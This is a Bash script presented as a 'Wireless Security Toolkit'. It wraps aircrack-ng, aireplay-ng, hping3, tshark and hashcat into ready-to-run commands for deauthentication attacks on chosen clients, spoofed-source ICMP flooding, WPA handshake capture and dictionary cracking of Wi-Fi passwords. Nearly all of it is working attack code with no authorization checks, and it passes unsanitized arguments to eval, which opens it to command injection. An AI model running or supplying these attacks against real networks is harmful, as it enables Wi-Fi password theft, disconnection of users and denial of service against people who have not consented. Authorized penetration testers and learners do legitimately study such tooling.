#!/bin/bash
# Wireless Security Toolkit - Advanced Edition
# Usage: ./tool.sh [command] [options]

INTERFACE_MONITOR=${INTERFACE_MONITOR:-wlxe8de271462a3}
INTERFACE_MANAGED=${INTERFACE_MANAGED:-wlp2s0}
INTERFACE=${INTERFACE:-wlan0mon}

# Color codes
RED="\033[0;31m"
GREEN="\033[0;32m"
YELLOW="\033[1;33m"
CYAN="\033[1;36m"
NC="\033[0m"

# =============================== HELPERS ===============================
print_command() {
    printf "  ${CYAN}%-18s${NC} %s\n" "$1" "$2"
    printf "    ${GREEN}Usage:${NC} %s\n" "$3"
    printf "    ${GREEN}Options:${NC}\n"
    printf "      %-20s %s\n" "$4" "$5"
    printf "      %-20s %s\n" "$6" "$7"
    printf "      %-20s %s\n" "$8" "$9"
    echo ""
}

print_usage() {
    echo -e "${YELLOW}Wireless Security Toolkit${NC} - Command Reference"
    echo "Usage: ./tool.sh [command] [options]"
    echo ""
    echo -e "Commands:"
    echo ""
    
    print_command "monitor" "Set monitor mode" \
        "./tool.sh monitor" \
        "INTERFACE_MONITOR=wlxe8de271462a3" "External interface" \
        "-i wlxe8de271462a3" "Interface flag"

    print_command "managed" "Set managed mode" \
        "./tool.sh managed" \
        "INTERFACE=wlan0mon" "Monitor interface" \
        "-i wlan0mon" "Interface flag"

    print_command "scan2" "Scan 2.4GHz networks" \
        "./tool.sh scan2" \
        "INTERFACE=wlan0mon" "Monitor interface" \
        "-i wlan0mon" "Interface flag"

    print_command "scan5" "Scan 5GHz networks" \
        "./tool.sh scan5" \
        "INTERFACE=wlan0mon" "Monitor interface" \
        "-i wlan0mon" "Interface flag"

    print_command "scan-nm" "Scan with NetworkManager" \
        "./tool.sh scan-nm" \
        "INTERFACE_MANAGED=wlp2s0" "Managed interface" \
        "-i wlp2s0" "Interface flag"    

    print_command "deauth" "Perform deauth attack" \
        "./tool.sh deauth [AP_MAC] [CLIENT_MAC] | [-a AP_MAC -c CLIENT_MAC]" \
        "AP_MAC=00:11:22:33:44:55" "Target AP MAC" \
        "-a 00:11:22:33:44:55" "AP MAC flag" \
        "CLIENT_MAC=66:77:88:99:AA:BB" "Target client MAC" \
        "-c 66:77:88:99:AA:BB" "Client MAC flag"

    print_command "set-channel" "Set wireless channel" \
        "./tool.sh set-channel [CHANNEL]" \
        "CHANNEL=6" "Target channel (1-14)" \
        "-c 6" "Channel flag" \
        "INTERFACE=wlan0mon" "Monitor interface" \
        "-i wlan0mon" "Interface flag"

    print_command "ping-flood" "ICMP flood attack" \
        "./tool.sh ping-flood [SRC_IP] [DST_IP] | [-s SRC_IP -d DST_IP]" \
        "SRC_IP=10.0.0.1" "Spoofed source IP" \
        "-s 10.0.0.1" "Source IP flag" \
        "DST_IP=192.168.1.1" "Target IP address" \
        "-d 192.168.1.1" "Destination IP flag"

    print_command "capture-handshake" "Capture WPA handshake" \
        "./tool.sh capture-handshake [CHANNEL] [BSSID] [OUTPUT] | [-c CHANNEL -b BSSID -o OUTPUT]" \
        "CHANNEL=6" "Target channel" \
        "-c 6" "Channel flag" \
        "BSSID=00:11:22:33:44:55" "Target BSSID" \
        "-b 00:11:22:33:44:55" "BSSID flag" \
        "OUTPUT=file" "Output prefix" \
        "-o file" "Output flag"

    print_command "crack" "Crack WPA handshake" \
        "./tool.sh crack [WORDLIST] [CAP] | [-w WORDLIST -f CAP]" \
        "WORDLIST=wordlist.txt" "Password dictionary" \
        "-w wordlist.txt" "Wordlist flag" \
        "CAP=file.cap" "Capture file" \
        "-f file.cap" "Capture file flag"

    print_command "convert-hc" "Convert to Hashcat format" \
        "./tool.sh convert-hc [PCAP] [HASH_FILE] | [-p PCAP -H HASH_FILE]" \
        "PCAP=dump.pcapng" "Input capture file" \
        "-p dump.pcapng" "PCAP flag" \
        "HASH_FILE=hash.hc22000" "Output file" \
        "-H hash.hc22000" "Hash file flag"

    print_command "hashcat" "Attack with Hashcat" \
        "./tool.sh hashcat [HASH_FILE] [WORDLIST] | [-H HASH_FILE -w WORDLIST]" \
        "HASH_FILE=hash.hc22000" "Target hash file" \
        "-H hash.hc22000" "Hash file flag" \
        "WORDLIST=wordlist.txt" "Password dictionary" \
        "-w wordlist.txt" "Wordlist flag"
}

execute_and_check() {
    echo -e "${GREEN}=> $1${NC}"
    eval "$1"
    if [ $? -ne 0 ]; then
        echo -e "${RED}Command failed: $1${NC}"
        exit 1
    fi
}

# ======================================================================
#  PARAMETER PARSING
# ======================================================================
parse_common() {
    while getopts ":i:a:c:s:d:b:o:w:f:p:H:h" opt; do
        case $opt in
            i) INTERFACE="$OPTARG" ;;
            a) AP_MAC="$OPTARG" ;;
            c) CHANNEL="$OPTARG" ;;
            s) SRC_IP="$OPTARG" ;;
            d) DST_IP="$OPTARG" ;;
            b) BSSID="$OPTARG" ;;
            o) OUTPUT="$OPTARG" ;;
            w) WORDLIST="$OPTARG" ;;
            f) CAP="$OPTARG" ;;
            p) PCAP="$OPTARG" ;;
            H) HASH_FILE="$OPTARG" ;;
            h) print_usage ;;
            \?) echo "Invalid option -$OPTARG"; exit 1 ;;
        esac
    done
    shift $((OPTIND-1))
}

# ======================================================================
#  MONITOR MODE COMMANDO
# ======================================================================
cmd_monitor() {
    parse_common "$@"
    execute_and_check "airmon-ng start $INTERFACE_MONITOR"
    echo -e "${GREEN}Interface $INTERFACE_MONITOR in monitor mode (now $INTERFACE)${NC}"
}

# ======================================================================
#  MANAGED MODE COMMAND
# ======================================================================
cmd_managed() {
    parse_common "$@"
    execute_and_check "airmon-ng stop $INTERFACE"
    execute_and_check "systemctl start NetworkManager"
    echo -e "${GREEN}Interface $INTERFACE returned to managed mode${NC}"
}

# ======================================================================
#  2.4GHz SCAN COMMAND
# ======================================================================
cmd_scan2() {
    parse_common "$@"
    execute_and_check "airodump-ng --band bg $INTERFACE"
}

# ======================================================================
#  5GHz SCAN COMMAND
# ======================================================================
cmd_scan5() {
    parse_common "$@"
    execute_and_check "airodump-ng --band a $INTERFACE"
}

# ======================================================================
#  NETWORKMANAGER SCAN COMMAND
# ======================================================================
cmd_scan-nm() {
    parse_common "$@"
    execute_and_check "nmcli dev wifi list ifname $INTERFACE_MANAGED"
}

# ======================================================================
#  DEAUTH ATTACK COMMAND
# ======================================================================
cmd_deauth() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        AP_MAC=${AP_MAC:-$1}
        CLIENT_MAC=${CLIENT_MAC:-$2}
    fi
    [ -z "$AP_MAC" ] && { echo -e "${RED}AP_MAC required${NC}"; exit 1; }
    [ -z "$CLIENT_MAC" ] && { echo -e "${RED}CLIENT_MAC required${NC}"; exit 1; }
    execute_and_check "aireplay-ng --deauth 10 -a $AP_MAC -c $CLIENT_MAC $INTERFACE"
}

# ======================================================================
#  SET CHANNEL COMMAND
# ======================================================================
cmd_set-channel() {
    parse_common "$@"
    if [ $# -ge 1 ]; then
        CHANNEL=${CHANNEL:-$1}
    fi
    [ -z "$CHANNEL" ] && { echo -e "${RED}CHANNEL required${NC}"; exit 1; }
    execute_and_check "iw dev $INTERFACE set channel $CHANNEL"
}

# ======================================================================
#  PING FLOOD COMMAND
# ======================================================================
cmd_ping-flood() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        SRC_IP=${SRC_IP:-$1}
        DST_IP=${DST_IP:-$2}
    fi
    [ -z "$SRC_IP" ] && { echo -e "${RED}SRC_IP required${NC}"; exit 1; }
    [ -z "$DST_IP" ] && { echo -e "${RED}DST_IP required${NC}"; exit 1; }
    execute_and_check "hping3 -1 --flood -a $SRC_IP $DST_IP"
}

# ======================================================================
#  CAPTURE HANDSHAKE COMMAND
# ======================================================================
cmd_capture-handshake() {
    parse_common "$@"
    if [ $# -ge 3 ]; then
        CHANNEL=${CHANNEL:-$1}
        BSSID=${BSSID:-$2}
        OUTPUT=${OUTPUT:-$3}
    fi
    [ -z "$CHANNEL" ] && { echo -e "${RED}CHANNEL required${NC}"; exit 1; }
    [ -z "$BSSID" ] && { echo -e "${RED}BSSID required${NC}"; exit 1; }
    [ -z "$OUTPUT" ] && { echo -e "${RED}OUTPUT required${NC}"; exit 1; }
    
    echo -e "${GREEN}Starting airodump-ng capture...${NC}"
    execute_and_check "airodump-ng -w $OUTPUT -c $CHANNEL --bssid $BSSID $INTERFACE"
    
    local CAP_FILE="${OUTPUT}-01.cap"
    if [ ! -f "$CAP_FILE" ]; then
        echo -e "${RED}Capture file $CAP_FILE not found${NC}"
        exit 1
    fi

    echo -e "${GREEN}Extracting client MAC from EAPOL packets...${NC}"
    local CLIENT_MAC=$(tshark -r "$CAP_FILE" \
        -Y "eapol && wlan.bssid == $BSSID && wlan.sa != $BSSID" \
        -T fields -e wlan.sa 2>/dev/null | 
        grep -Eio '[0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}' | 
        sort -u | head -n 1)
    if [ -z "$CLIENT_MAC" ]; then
        echo -e "${RED}MAC client non trovato. Visualizzo tutti i MAC trovati:${NC}"
        tshark -r "$CAP_FILE" -Y "eapol" -T fields -e wlan.sa -e wlan.da
        exit 1
    fi

    echo -e "\n${GREEN}Generated Wireshark filter:${NC}"
    local FILTER="(wlan.fc.type == 0 && wlan.bssid == $BSSID) || 
        (wlan.fc.type_subtype == 0x08 && wlan.bssid == $BSSID) || 
        (wlan.fc.type_subtype == 0x05 && wlan.sa == $BSSID) || 
        (wlan.fc.type_subtype == 0x00 && wlan.sa == $CLIENT_MAC) || 
        (wlan.fc.type_subtype == 0x01 && wlan.sa == $CLIENT_MAC) || 
        (eapol && (wlan.sa == $BSSID || wlan.sa == $CLIENT_MAC))"
    
    echo -e "${GREEN}Filtering capture...${NC}"
    local FILTERED_PCAP="${OUTPUT}_filtered.pcap"
    execute_and_check "tshark -r $CAP_FILE -Y \"$FILTER\" -w $FILTERED_PCAP -F pcap\n"

    echo -e "${GREEN}Extracting final EAPOL messages...${NC}"
    local FINAL_EAPOL=$(tshark -r "$FILTERED_PCAP" -Y "eapol" -T fields -e frame.number 2>/dev/null | tail -n +2)
    local LAST_FRAME=$(echo "$FINAL_EAPOL" | tail -n 1)
    
    local FINAL_FILTER="frame.number <= $LAST_FRAME || wlan.fc.type_subtype == 0x08"
    tshark -r "$FILTERED_PCAP" -Y "$FINAL_FILTER" -w "${OUTPUT}_final.pcap" -F pcap

    echo -e "\n${GREEN}SUCCESS: Captured handshake with final EAPOL messages${NC}"
    echo -e "${YELLOW}Verify with: ${CYAN}./wifi-toolkit.sh crack wordlist.txt ${OUTPUT}_final.pcap${NC}\n"
}

# ======================================================================
#  CRACK HANDSHAKE COMMAND
# ======================================================================
cmd_crack() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        WORDLIST=${WORDLIST:-$1}
        CAP=${CAP:-$2}
    fi
    [ -z "$WORDLIST" ] && { echo -e "${RED}WORDLIST required${NC}"; exit 1; }
    [ -z "$CAP" ] && { echo -e "${RED}CAP required${NC}"; exit 1; }
    execute_and_check "aircrack-ng -a2 -w $WORDLIST $CAP"
}

# ======================================================================
#  CONVERT TO HASHCAT FORMAT
# ======================================================================
cmd_convert-hc() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        PCAP=${PCAP:-$1}
        HASH_FILE=${HASH_FILE:-$2}
    fi
    [ -z "$PCAP" ] && { echo -e "${RED}PCAP required${NC}"; exit 1; }
    [ -z "$HASH_FILE" ] && { echo -e "${RED}HASH_FILE required${NC}"; exit 1; }
    execute_and_check "hcxpcapngtool -o $HASH_FILE -E ssids $PCAP"
}

# ======================================================================
#  HASHCAT ATTACK COMMAND
# ======================================================================
cmd_hashcat() {
    parse_common "$@"
    if [ $# -ge 2 ]; then
        HASH_FILE=${HASH_FILE:-$1}
        WORDLIST=${WORDLIST:-$2}
    fi
    [ -z "$HASH_FILE" ] && { echo -e "${RED}HASH_FILE required${NC}"; exit 1; }
    [ -z "$WORDLIST" ] && { echo -e "${RED}WORDLIST required${NC}"; exit 1; }
    execute_and_check "hashcat -m 22000 $HASH_FILE $WORDLIST"
}

# ======================================================================
#  MAIN EXECUTION
# ======================================================================
case "$1" in
    monitor)
        shift
        cmd_monitor "$@" ;;
    managed)
        shift
        cmd_managed "$@" ;;
    scan2)
        shift
        cmd_scan2 "$@" ;;
    scan5)
        shift
        cmd_scan5 "$@" ;;
    scan-nm)
        shift
        cmd_scan-nm "$@" ;;
    deauth)
        shift
        cmd_deauth "$@" ;;
    set-channel)
        shift
        cmd_set-channel "$@" ;;
    ping-flood)
        shift
        cmd_ping-flood "$@" ;;
    capture-handshake)
        shift
        cmd_capture-handshake "$@" ;;
    crack)
        shift
        cmd_crack "$@" ;;
    convert-hc)
        shift
        cmd_convert-hc "$@" ;;
    hashcat)
        shift
        cmd_hashcat "$@" ;;
    
    help|*) 
        print_usage
        exit ${1:-1} ;;
esac